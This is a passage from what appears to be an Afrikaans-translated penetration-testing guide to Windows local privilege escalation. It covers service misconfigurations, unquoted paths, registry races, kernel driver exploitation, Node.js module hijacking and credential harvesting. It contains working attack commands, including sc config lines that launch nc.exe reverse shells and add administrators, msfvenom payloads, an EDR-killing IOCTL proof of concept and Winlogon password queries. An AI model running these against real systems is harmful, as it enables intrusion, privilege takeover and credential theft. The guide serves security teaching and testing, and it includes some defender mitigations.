sc.exe config usosvc start= auto
```
### **Wysig diens-binêre pad**

In die scenario waar die "Authenticated users"-groep **SERVICE_ALL_ACCESS** op ’n diens besit, is wysiging van die diens se uitvoerbare binêre moontlik. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Voorregte kan deur verskeie toestemmings verhoog word:

- **SERVICE_CHANGE_CONFIG**: Laat herkonfigurasie van die diensbinary toe.
- **WRITE_DAC**: Maak herkonfigurasie van toestemmings moontlik, wat lei tot die vermoë om diensk konfigurasies te verander.
- **WRITE_OWNER**: Laat die verkryging van eienaarskap en herkonfigurasie van toestemmings toe.
- **GENERIC_WRITE**: Erf die vermoë om diensk onfigurasies te verander.
- **GENERIC_ALL**: Erf ook die vermoë om diensk onfigurasies te verander.

Vir die opsporing en exploitation van hierdie kwesbaarheid kan _exploit/windows/local/service_permissions_ gebruik word.

### Swak toestemmings op diensbinaries

As ’n diens as **`LocalSystem`**, **`LocalService`**, **`NetworkService`** of ’n bevoorregte domeinrekening loop, maar **gebruikers met lae voorregte die diens se EXE of sy ouergids kan wysig**, kan die diens dikwels gekaap word deur **die binary te vervang en die diens te herbegin**.

**Kontroleer of jy die binary wat deur ’n diens uitgevoer word, kan wysig** of of jy **skryftoestemmings het op die gids** waar die binary geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binary wat deur ’n diens uitgevoer word met **wmic** kry (nie in system32 nie) en jou toestemmings met **icacls** nagaan:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Soek na gevaarlike ACLs wat aan **`Everyone`**, **`BUILTIN\Users`** of **`Authenticated Users`** toegeken is, veral **`(F)`**, **`(M)`** of **`(W)`** op die diens se uitvoerbare lêer of op die gids wat dit bevat. ’n Praktiese misbruikvloei is:<sup>[[27]](#references)</sup>

1. Bevestig die diensrekening en pad na die uitvoerbare lêer met `sc qc <service_name>`.
2. Bevestig dat die binary skryfbaar is met `icacls <path>`.
3. Vervang die diens se binary met ’n payload of ’n geldige malicious service binary.
4. Herbegin die diens met `sc stop <service_name> && sc start <service_name>` (of wag vir ’n herlaai / dienssneller).

Nuttige geoutomatiseerde kontroles:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> As die diens nie ’n normale gebruiker toelaat om dit te herbegin nie, kyk of dit outomaties tydens opstart begin, ’n mislukkingsaksie het wat dit weer begin, of indirek deur die toepassing wat dit gebruik, geaktiveer kan word.

### Toestemmings om diensregisters te wysig

Jy moet nagaan of jy enige diensregister kan wysig.\
Jy kan jou **toestemmings** oor ’n diens-**register** **nagaan** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Daar moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings het. Indien wel, kan die binêre lêer wat deur die diens uitgevoer word, gewysig word.

Om die Path van die binêre lêer wat uitgevoer word, te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Register-simboliese-skakel-race na arbitrêre HKLM-waardeskryf (ATConfig)

Sommige Windows Accessibility-kenmerke skep **ATConfig**-sleutels per gebruiker wat later deur ’n **SYSTEM**-proses na ’n HKLM-sessiesleutel gekopieer word. ’n Register-**simboliese-skakel-race** kan daardie bevoorregte skryfaksie na **enige HKLM-pad** herlei, wat ’n arbitrêre HKLM-**waardeskryf**-primitive bied.<sup>[[18]](#references)</sup>

Sleutelliggings (voorbeeld: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lys geïnstalleerde Accessibility-kenmerke.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stoor gebruikerbeheerde konfigurasie.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` word tydens aanmelding/secure-desktop-oorgange geskep en is deur die gebruiker skryfbaar.

Misbruikvloei (CVE-2026-24291 / ATConfig):

1. Vul die **HKCU ATConfig**-waarde wat jy deur SYSTEM wil laat skryf.
2. Aktiveer die secure-desktop-kopiëring (byvoorbeeld **LockWorkstation**), wat die AT broker-vloei begin.
3. **Wen die race** deur ’n **oplock** op `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` te plaas; wanneer die oplock aktiveer, vervang die **HKLM Session ATConfig**-sleutel met ’n **registry link** na ’n beskermde HKLM-teiken.
4. SYSTEM skryf die aanvallergekose waarde na die herleide HKLM-pad.

Sodra jy arbitrêre HKLM-waardeskryf het, pivot jy na LPE deur dienskonfigurasiewaardes te oorskryf:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Kies ’n diens wat ’n gewone gebruiker kan begin (byvoorbeeld **`msiserver`**) en aktiveer dit nadat die skryfaksie voltooi is. **Nota:** die openbare exploit-implementering **sluit die workstation** as deel van die race.

Voorbeeldtools (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

As jy hierdie permission oor 'n registry het, beteken dit **dat jy subregistries vanaf hierdie een kan skep**. In die geval van Windows services is dit **genoeg om arbitrary code uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

As die path na 'n executable nie binne quotes is nie, sal Windows probeer om elke ending voor 'n spasie uit te voer.

Byvoorbeeld, vir die path _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle dienspaaie sonder aanhalingstekens, met uitsluiting van dié wat aan ingeboude Windows-dienste behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid met metasploit opspoor en uitbuit:** `exploit/windows/local/trusted\_service\_path` Jy kan handmatig ’n diensbinêre lêer met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat geneem moet word indien ’n diens faal. Hierdie funksie kan gekonfigureer word om na ’n binary te wys. Indien hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede kan in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) gevind word.

## Toepassings

### Geïnstalleerde toepassings

Gaan **toestemmings van die binaries** na (dalk kan jy een oorskryf en privilege escalation uitvoer) en van die **vouers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryftoestemmings

Kyk of jy een of ander config file kan wysig om ’n spesiale lêer te lees, of of jy ’n binary kan wysig wat deur ’n Administrator-rekening uitgevoer gaan word (schedtasks).

’n Manier om swak vouer-/lêertoestemmings in die stelsel te vind, is deur die volgende uit te voer:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ laai enige plugin DLL outomaties onder sy `plugins`-subgidse. Indien ’n skryfbare portable/copy-installasie teenwoordig is, gee die plasing van ’n kwaadwillige plugin outomatiese code execution binne `notepad++.exe` met elke bekendstelling (insluitend vanaf `DllMain` en plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Begin met opstart

**Kontroleer of jy ’n registry of binary kan oorskryf wat deur ’n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns-liggings om privileges te eskaleer**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drywers

Soek na moontlike **third party vreemde/kwesbare** drywers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As ’n driver ’n arbitrêre kernel lees/skryf-primitive blootstel (algemeen in swak ontwerpte IOCTL-handlers), kan jy na SYSTEM eskaleer deur ’n SYSTEM-token direk uit kernelgeheue te steel.<sup>[[13]](#references)</sup> Sien die stap-vir-stap-tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Vir race-condition-bugs waar die kwesbare oproep ’n aanvaller-beheerde Object Manager-pad oopmaak, kan die lookup doelbewus vertraag word (deur komponente met die maksimum lengte of diep directory chains te gebruik) om die venster van mikrosekondes na tientalle mikrosekondes uit te rek:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, en I/O ring pivots

Sommige Windows kernel LPE-chains kan uit twee individueel swak bugs opgebou word: ’n **cancel-safe queue lifetime race** wat ’n request/CBD vrylaat terwyl die queue-lock steeds gehou word, en ’n **lock-release-before-copy** disclosure wat ’n vrygestelde paged-pool allocation tydens `RtlCopyToUser` laat lek.<sup>[[29]](#references)</sup>

Oudit- en exploitation-notas:

- **Free-under-lock + cancel afterwards**: soek ’n success path wat **Acquire -> CompleteRequest/free -> Release** uitvoer terwyl die cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** uitvoer. As die success path `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` bereik voordat die CBDQ/CSQ-lock vrygestel word, kan ’n thread wat in `NtCancelIoFileEx -> IopCsqCancelRoutine` geblokkeer is later hervat en ’n vrygestelde `PFLT_CALLBACK_DATA` terugstuur na die driver se remove callback.
- **Reclaim the freed queue object** met ’n same-sized, aanvaller-beheerde paged-pool allocation. `NPFS` Data Queue Entries is nuttig omdat die payload en grootte beheerbaar is en jy dit later met pipe read/peek-operasies kan ondersoek. As die vrygestelde objek list links insluit, oorskryf hulle met ’n **cyclic list of fake request nodes in user memory** sodat die driver herhaaldelik aanvaller-gedefinieerde request structures verwerk in plaas daarvan om by die oorspronklike list head te eindig.
- **Upgrade a predictable write**: as die fake request ’n geneste context pointer herlei wat deur bookkeeping writes gebruik word (timestamps / QPC / refcount-adjacent fields), kan jy moontlik ’n **address-controlled but not value-controlled** kernel write kry. In daardie geval, teiken ’n sprayed pool object se **length/size** field eerder as ’n finale code/data pointer, en enumerate dan die spray totdat die korrupte objek ’n **out-of-bounds paged-pool read** lewer.
- **Raceable disclosure pattern**: enige syscall wat `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` uitvoer, is ’n sterk kandidaat. Reliability verbeter wanneer die aanvaller die gekopieerde buffer kan vergroot (byvoorbeeld deur baie list/resource entries by te voeg wat ’n serializer se finale allocation size verhoog), omdat die langer copy die replacement window verbreed sonder om die masjien noodwendig te laat crash.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays is uitstekende disclosure-teikens omdat hul paged-pool-grootte aanvaller-beheer word (`8 * regBufferCnt`) en elke element ’n kernel pointer na ’n `_IOP_MC_BUFFER_ENTRY` is. Leak een van hierdie arrays, herstel die omliggende `IORING_OBJECT`, en korrupteer dan **`RegBuffers`** en **`RegBuffersCount`** sodat daaropvolgende I/O ring-operasies attacker-forged entries gebruik en arbitrêre kernel read/write verskaf. As die enigste beskikbare write vir jou ’n stabiele byte gee (byvoorbeeld vanaf `KUSER_SHARED_DATA+0x14`), gebruik **overlapping unaligned writes** om ’n repeated-byte user pointer soos `0x0101010101010101` te bou, map dit met `VirtualAlloc`, en plaas die forged registered-buffer array daar.<sup>[[30]](#references)</sup>

Nuttige debugging indicators:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Sodra jy arbitrary kernel read/write van die corrupted I/O ring verkry, steel ’n SYSTEM token deur die standard post-primitive workflow te gebruik:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne hive-kwesbaarhede laat jou toe om deterministiese uitlegte te groom, writable HKLM/HKU-afstammelinge te abuse, en metadata-corruption in kernel paged-pool overflows om te skakel sonder ’n custom driver. Leer die volledige chain hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion vanaf attacker-controlled paths

Sommige drivers aanvaar ’n registry path vanaf userland, valideer slegs dat dit ’n geldige UTF-16-string is, en roep dan `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` met `RTL_QUERY_REGISTRY_DIRECT` na ’n stack scalar soos `int readValue`. Indien `RTL_QUERY_REGISTRY_TYPECHECK` ontbreek, word `EntryContext` volgens die **werklike** registry-tipe geïnterpreteer, nie volgens die tipe wat die developer verwag het nie.

Dit skep twee nuttige primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ’n user-controlled absolute `\Registry\...` path laat die driver toe om attacker-chosen keys te query, bestaan deur return codes/logs te leak, en soms waardes te lees waartoe die caller nie direk toegang kon verkry nie.
- **Kernel memory corruption**: ’n scalar destination soos `&readValue` word as ’n `REG_QWORD`, `UNICODE_STRING`, of sized binary buffer volgens die registry value-tipe as die verkeerde tipe geïnterpreteer.

Praktiese exploitation-notas:

- **Windows 8+ mitigation**: indien die query ’n **untrusted hive** tref met `RTL_QUERY_REGISTRY_DIRECT`, maar sonder `RTL_QUERY_REGISTRY_TYPECHECK`, crash kernel callers met `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Om exploitability te behou, soek **attacker-writable keys binne trusted system hives** eerder as om waardes onder `HKCU` te stage.
- **Trusted-hive staging**: gebruik NtObjectManager om writable descendants van `\Registry\Machine` te enumerate, en voer die scan weer uit met ’n gedupliseerde **low-integrity** token om keys te vind wat vanaf sandboxed contexts bereikbaar is:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: ’n 8-grepe direkte skrywing na ’n 4-grepe `int` korrupteer aangrensende stack-data en kan ’n nabygeleë callback/function pointer gedeeltelik oorskryf.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode verwag dat `EntryContext` na ’n `UNICODE_STRING` wys. As die kode eers ’n aanvaller-beheerde `REG_DWORD` in ’n stack-scalar laai en dan dieselfde buffer vir ’n string read hergebruik, beheer die aanvaller `Length`/`MaximumLength` en beïnvloed hy die `Buffer`-pointer gedeeltelik, wat ’n semi-beheerde kernel write tot gevolg het.
- **`REG_BINARY`**: vir groot binary data behandel direct mode die eerste `LONG` by `EntryContext` as ’n signed buffer size. As ’n vorige `REG_DWORD` read ’n **negatiewe**, aanvaller-beheerde waarde in die hergebruikte scalar laat, kopieer die volgende `REG_BINARY` query aanvaller-bytes direk oor aangrensende stack-slots, wat dikwels die skoonste pad na ’n volledige callback-pointer overwrite is.

Sterk hunting-patroon: **heterogene registry reads na dieselfde stack-variable sonder om dit te herinitialiseer**. Grep vir `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, hergebruikte `EntryContext`-pointers, en code paths waar die eerste registry read beheer of ’n tweede read plaasvind.

#### Misbruik van ontbrekende FILE_DEVICE_SECURE_OPEN op device objects (LPE + EDR kill)

Sommige signed third-party drivers skep hul device object met ’n sterk SDDL via IoCreateDeviceSecure, maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie flag word die secure DACL nie afgedwing wanneer die device deur ’n path met ’n ekstra component oopgemaak word nie, wat enige unprivileged user toelaat om ’n handle te verkry deur ’n namespace path soos die volgende te gebruik:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (uit ’n real-world case)

Sodra ’n user die device kan oopmaak, kan privileged IOCTLs wat deur die driver blootgestel word vir LPE en tampering misbruik word. Voorbeeld-capabilities wat in die praktyk waargeneem is:
- Return full-access handles na arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, insluitend Protected Process/Light (PP/PPL), wat AV/EDR kill vanaf user land via kernel moontlik maak.

Minimal PoC-patroon (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations vir developers
- Stel altyd FILE_DEVICE_SECURE_OPEN wanneer device objects geskep word wat deur ’n DACL beperk moet word.
- Valideer die caller context vir privileged operations. Voeg PP/PPL checks by voordat process termination of handle returns toegelaat word.
- Beperk IOCTLs (access masks, METHOD_*, input validation) en oorweeg brokered models in plaas van direkte kernel privileges.

Detection-idees vir defenders
- Monitor user-mode opens van verdagte device names (bv. \\ .\\amsdk*) en spesifieke IOCTL sequences wat op abuse dui.
- Dwing Microsoft se vulnerable driver blocklist af (HVCI/WDAC/Smart App Control) en handhaaf jou eie allow/deny lists.


## PATH DLL Hijacking

As jy **write permissions binne ’n folder wat op PATH voorkom** het, kan jy moontlik ’n DLL wat deur ’n process gelaai word, hijack en **privileges eskaleer**.<sup>[[2]](#references)</sup>

Check permissions van alle folders binne PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te abuse:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Dit is ’n **Windows uncontrolled search path**-variant wat **Node.js**- en **Electron**-toepassings raak wanneer hulle ’n bare import soos `require("foo")` uitvoer en die verwagte module **ontbreek**.<sup>[[20]](#references)</sup>

Node los packages op deur die directory tree op te loop en `node_modules`-folders in elke ouer-directory na te gaan. Op Windows kan hierdie soektog die drive root bereik, sodat ’n toepassing wat vanaf `C:\Users\Administrator\project\app.js` geloods word, uiteindelik die volgende kan toets:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

As ’n **low-privileged user** `C:\node_modules` kan skep, kan hulle ’n kwaadwillige `foo.js` (of package-folder) plant en wag totdat ’n **higher-privileged Node/Electron process** die ontbrekende dependency probeer oplos. Die payload word in die security context van die slagofferproses uitgevoer, sodat dit **LPE** word wanneer die teiken as ’n administrator, vanuit ’n elevated scheduled task/service wrapper, of vanuit ’n outomaties-startende privileged desktop app loop.

Dit kom veral voor wanneer:

- ’n dependency in `optionalDependencies` verklaar word<sup>[[22]](#references)</sup>
- ’n third-party library `require("foo")` in `try/catch` omvou en ná ’n failure voortgaan
- ’n package uit production builds verwyder is, tydens packaging weggelaat is, of nie kon installeer nie
- die kwesbare `require()` diep binne die dependency tree voorkom, eerder as in die hoof-toepassingskode

### Soek na kwesbare teikens

Gebruik **Procmon** om die resolution path te bewys:<sup>[[23]](#references)</sup>

- Filter volgens `Process Name` = die teiken-executable (`node.exe`, die Electron-app-EXE, of die wrapper-process)
- Filter volgens `Path` `contains` `node_modules`
- Fokus op `NAME NOT FOUND` en die finale suksesvolle open onder `C:\node_modules`

Nuttige code-review-patrone in uitgepakte `.asar`-lêers of application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Uitbuiting

1. Identifiseer die **ontbrekende pakketnaam** uit Procmon of deur bronhersiening.
2. Skep die wortel-opsoekgids indien dit nog nie bestaan nie:
```powershell
mkdir C:\node_modules
```
3. Plaas ’n module met die presies verwagte naam:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Aktiveer die slagoffertoepassing. As die toepassing `require("foo")` probeer uitvoer en die wettige module ontbreek, kan Node `C:\node_modules\foo.js` laai.

Werklike voorbeelde van ontbrekende opsionele modules wat by hierdie patroon pas, sluit `bluebird` en `utf-8-validate` in, maar die **tegniek** is die herbruikbare deel: vind enige **ontbrekende bare import** wat ’n geprivilegieerde Windows Node/Electron-proses sal resolve.

### Idees vir opsporing en hardening

- Genereer ’n waarskuwing wanneer ’n gebruiker `C:\node_modules` skep of nuwe `.js`-lêers/-packages daarheen skryf.
- Soek na hoë-integriteit-prosesse wat vanaf `C:\node_modules\*` lees.
- Pakket al die runtime-afhanklikhede in production en oudit die gebruik van `optionalDependencies`.
- Hersien third-party-kode vir stil `try { require("...") } catch {}`-patrone.
- Deaktiveer opsionele probes wanneer die library dit ondersteun (byvoorbeeld, sommige `ws`-deployments kan die legacy `utf-8-validate`-probe vermy met `WS_NO_UTF_8_VALIDATE=1`).

## Netwerk

### Delings
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kyk vir ander bekende rekenaars wat hardcoded is in die hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerkkoppelvlakke & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kontroleer vir **beperkte dienste** van buite af
```bash
netstat -ano #Opened ports?
```
### Roeteringstabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewallreëls

[**Kyk op hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

Meer[ opdragte vir netwerk-enumerasie hier](../basic-cmd-for-pentesters.md#network)

### Windows-substelsel vir Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root-gebruikerstoegang verkry, kan jy op enige poort luister (die eerste keer wat jy `nc.exe` gebruik om op ’n poort te luister, sal dit via GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om bash maklik as root te begin, kan jy `--default-user root` probeer

Jy kan die `WSL`-lêerstelsel in die vouer `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` verken

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault stoor gebruiker se aanmeldingsbesonderhede vir bedieners, webwerwe en ander programme wat **Windows** kan gebruik om **gebruikers outomaties aan te meld**. Aanvanklik klink dit dalk asof gebruikers aanmeldingsbesonderhede vir webwerwe soos Facebook, Twitter of Gmail kan stoor en blaaiers outomaties kan laat aanmeld, maar dit is nie hoe dit werk nie.

Windows Vault stoor aanmeldingsbesonderhede waarmee Windows gebruikers outomaties kan aanmeld. Dit beteken dat enige **Windows-toepassing wat aanmeldingsbesonderhede benodig om toegang tot ’n hulpbron te verkry** (’n bediener of ’n webwerf), **hierdie Credential Manager** & Windows Vault kan gebruik en die verskafde aanmeldingsbesonderhede kan gebruik, in plaas daarvan dat gebruikers elke keer die gebruikersnaam en wagwoord moet invoer.

